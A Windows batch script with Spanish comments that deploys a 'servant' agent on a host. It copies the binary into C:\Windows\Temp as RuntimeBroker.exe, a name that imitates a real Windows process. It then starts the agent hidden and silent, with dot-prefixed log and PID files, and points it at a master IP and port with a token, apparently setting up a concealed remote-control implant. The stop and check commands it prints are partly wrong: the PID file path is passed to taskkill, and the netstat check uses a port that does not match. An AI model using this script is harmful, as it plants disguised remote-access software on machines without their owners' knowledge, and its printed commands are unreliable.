@echo off
REM Script de despliegue rápido para Windows
REM Ejecutar en el host remoto o localmente

set TOKEN=tu-token-secreto-aqui
set MASTER_IP=192.168.1.100
set MASTER_PORT=65433
set SERVANT_PATH=C:\Windows\Temp\RuntimeBroker.exe
set LOGFILE=C:\Windows\Temp\.srv.log
set PIDFILE=C:\Windows\Temp\.srv.pid

echo === Desplegando Servant en Windows ===
echo.

REM Copiar binario si no existe
if not exist "%SERVANT_PATH%" (
    echo Copiando binario...
    copy RuntimeBroker.exe "%SERVANT_PATH%"
)

REM Ejecutar en modo oculto
echo Iniciando servant...
start /B "" "%SERVANT_PATH%" --hide-window --silent --token %TOKEN% --logfile "%LOGFILE%" --pidfile "%PIDFILE%" --master-host %MASTER_IP% --master-port %MASTER_PORT%

echo.
echo Servant desplegado y ejecutándose en segundo plano.
echo PID guardado en: %PIDFILE%
echo Logs en: %LOGFILE%
echo.
echo Para detener:
echo   taskkill /F /PID %PIDFILE%
echo.
echo Para verificar:
echo   tasklist | findstr RuntimeBroker
echo   netstat -ano | findstr :65432
